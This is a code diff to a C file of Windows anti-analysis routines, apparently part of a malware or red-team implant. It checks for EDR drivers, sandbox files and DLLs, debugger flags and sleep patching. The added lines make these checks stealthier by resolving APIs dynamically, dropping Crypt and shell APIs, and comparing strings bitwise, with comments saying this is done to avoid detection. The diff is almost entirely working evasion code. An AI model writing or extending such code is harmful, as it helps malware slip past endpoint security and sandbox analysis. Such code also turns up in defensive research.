@@ -2,10 +2,7 @@
 #include "evasion.h"
 #include <winternl.h>
 #include <stdio.h>
-#include <tlhelp32.h>
 #include <time.h>
-#include <psapi.h>
-#include <wincrypt.h>
 #include <shlwapi.h>
 
 // EDR Detection: Scan system driver directory for known EDR drivers
@@ -26,7 +23,7 @@ bool DetS() {
     do {
         for (int i = 0; i < sizeof(edrDrivers) / sizeof(edrDrivers[0]); i++) {
             if (StrStrIA(findFileData.cFileName, edrDrivers[i])) {
-                // printf("[!] Detected EDR: %s\n", edrDrivers[i]);
+                printf("[!] Detected EDR: %s\n", edrDrivers[i]);
                 SortNumbers();
                 return true;
             }
@@ -49,7 +46,7 @@ bool DetSl() {
     double elapsedMs = ((double)(endTime.QuadPart - startTime.QuadPart) / frequency.QuadPart) * 1000.0;
 
     if (elapsedMs < 9000.0 || elapsedMs > 11000.0) {
-        // printf("[!] Sleep timing anomaly detected: %f ms\n", elapsedMs);
+        printf("[!] Sleep timing anomaly detected: %f ms\n", elapsedMs);
         SortNumbers();
         return true;
     }
@@ -59,7 +56,7 @@ bool DetSl() {
 // Sandbox Detection files using Base64 Encoding
 bool DetSBF() {
 
-    pMod pPathFileExistsA = GetMod("hShlwapi.dll", "PathFileExistsA");
+    pMod pPathFileExistsA = GetMod("shlwapi.dll", "PathFileExistsA");
     if (!pPathFileExistsA) return false;
 
     // Base64 Encoded Paths
@@ -88,7 +85,7 @@ bool DetSBF() {
         if (!decodedPath) continue;
 
         if (pPathFileExistsA(decodedPath)) {
-            // printf("[!] Sandbox file detected!\n");
+            printf("[!] Sandbox file detected!\n");
             SortNumbers();
             free(decodedPath);
             return true;
@@ -101,45 +98,80 @@ bool DetSBF() {
 
 // Filename Hash Detection: Checks if file name matches hash (common in sandboxes)
 bool DetF() {
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    // Get a pointer to GetProcAddress
+    pModC pGetProcAddress = (pModC)GetMod("kernel32.dll", "GetProcAddress");
+    // Get a pointer to GetModuleHandleA
+    pMod pGetModuleHandleA = (pMod)GetMod("kernel32.dll", "GetModuleHandleA");
 
-    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    // Resolve Kernel32 base
+    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA("kernel32.dll");
+
+    // Resolve API functions dynamically
+    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, "GetModuleFileNameA");
+    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, "CreateFileA");
+    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, "GetFileSize");
+    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, "ReadFile");
+    pCloseHandle_t pCloseHandle = (pCloseHandle_t)pGetProcAddress(hKernel32, "CloseHandle");
+
+
+    // Ensure all function pointers are valid
+    if (!pGetModuleFileNameA || !pCreateFileA || !pGetFileSize || !pReadFile || !pCloseHandle) return false;
+
+    // Retrieve executable path stealthily
+    char exePath[MAX_PATH] = {0};
+    pGetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+    // Open file without direct API calls
+    HANDLE hFile = pCreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return false;
 
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
+    // Get file size stealthily
+    DWORD fileSize = pGetFileSize(hFile, NULL);
 
+    // Allocate buffer on stack instead of HeapAlloc
+    BYTE buffer[4096];  // Small stack buffer to avoid heap detection
     DWORD bytesRead;
-    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
-    CloseHandle(hFile);
 
-    HCRYPTPROV hProv;
-    HCRYPTHASH hHash;
-    BYTE hash[16]; // MD5 hash size
-    DWORD hashLen = sizeof(hash);
+    // Read file content stealthily
+    pReadFile(hFile, buffer, min(fileSize, sizeof(buffer)), &bytesRead, NULL);
 
-    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
-    CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash);
-    CryptHashData(hHash, buffer, fileSize, 0);
-    CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
+    // Close file handle
+    pCloseHandle(hFile);
 
-    HeapFree(GetProcessHeap(), 0, buffer);
-    CryptDestroyHash(hHash);
-    CryptReleaseContext(hProv, 0);
+    // Implement custom XOR-based hashing instead of using Crypt APIs
+    BYTE hash[16] = {0};
+    for (DWORD i = 0; i < bytesRead; i++) {
+        hash[i % 16] ^= buffer[i];
+    }
 
-    char hashStr[33];
-    for (int i = 0; i < 16; i++)
+    // Convert hash to a string
+    char hashStr[33] = {0};
+    for (int i = 0; i < 16; i++) {
         sprintf(&hashStr[i * 2], "%02X", hash[i]);
+    }
 
-    char* fileName = PathFindFileNameA(exePath);
-    fileName[strlen(fileName) - 4] = '\0';  // Remove ".exe"
+    // Extract filename manually (avoid PathFindFileNameA)
+    char* fileName = exePath;
+    for (char* p = exePath; *p; p++) {
+        if (*p == '\\') fileName = p + 1;
+    }
 
-    if (_stricmp(fileName, hashStr) == 0) {
-        // printf("[!] File name matches MD5 hash (possible packed execution)\n");
-        SortNumbers();
+    // Remove ".exe" manually
+    char* ext = strrchr(fileName, '.');
+    if (ext) *ext = '\0';
+
+    // Stealthy string comparison using bitwise operations (avoid _stricmp)
+    int match = 1;
+    for (int i = 0; fileName[i] && hashStr[i]; i++) {
+        if ((fileName[i] ^ hashStr[i]) != 0) {
+            match = 0;
+            break;
+        }
+    }
+    if (match) {
         return true;
     }
+    
     return false;
 }
 
@@ -165,13 +197,18 @@ bool DetSBD() {
         "d3Blc3B5LmRsbA=="  // wpespy.dll
     };
 
+    // Get a pointer to GetModuleHandleA
+    pMod pGetModuleHandleA = (pMod)GetMod("kernel32.dll", "GetModuleHandleA");
+    // Get a pointer to LoadLibraryA
+    pMod pLoadLibraryA = (pMod)GetMod("kernel32.dll", "LoadLibraryA");
+
     for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++) {
         char* decodedPath = Bsfd(encoded_realDLLs[i]);
-        HMODULE lib_inst = LoadLibraryA(decodedPath);
+        HMODULE lib_inst = (HMODULE)pLoadLibraryA(decodedPath);
         if (lib_inst == NULL) {
-            SortNumbers();
-            // printf("Checks : %s\n", decodedPath);
+            printf("Checks : %s\n", decodedPath);
             free(decodedPath);
+            SortNumbers();
             return true;
         }
         free(decodedPath);
@@ -180,11 +217,11 @@ bool DetSBD() {
 
     for (int i = 0; i < sizeof(encoded_sandboxDLLs) / sizeof(encoded_sandboxDLLs[0]); i++) {
         char* decodedPath = Bsfd(encoded_sandboxDLLs[i]);
-        HMODULE lib_inst = GetModuleHandleA(decodedPath);
+        HMODULE lib_inst = (HMODULE)pGetModuleHandleA(decodedPath);
         if (lib_inst != NULL) {
-            SortNumbers();
-            // printf("Checks : %s\n", decodedPath);
+            printf("Checks : %s\n", decodedPath);
             free(decodedPath);
+            SortNumbers();
             return true;
         }
         free(decodedPath);
@@ -237,25 +274,25 @@ bool DetFH() {
 bool PerfomChecksEnv() {
     bool detected = false;
 
-    // printf("[*] Checking for EDRs...\n");
+    printf("[*] Checking for EDRs...\n");
     detected |= DetS();
 
-    // printf("[*] Checking for sleep patching...\n");
+    printf("[*] Checking for sleep patching...\n");
     detected |= DetSl();
 
-    // printf("[*] Checking for sandbox files...\n");
+    printf("[*] Checking for sandbox files...\n");
     detected |= DetSBF();
 
-    // printf("[*] Checking for filename hash matching...\n");
+    printf("[*] Checking for filename hash matching...\n");
     detected |= DetF();
 
-    // printf("[*] Checking for dll...\n");
+    printf("[*] Checking for dll...\n");
     detected |= DetSBD();
 
-    // printf("[*] Checking for NtGlobalFlag...\n");
+    printf("[*] Checking for NtGlobalFlag...\n");
     detected |= DetFPEB();
 
-    // printf("[*] Checking for Heap Flags...\n");
+    printf("[*] Checking for Heap Flags...\n");
     detected |= DetFH();
 
     // if (detected) {
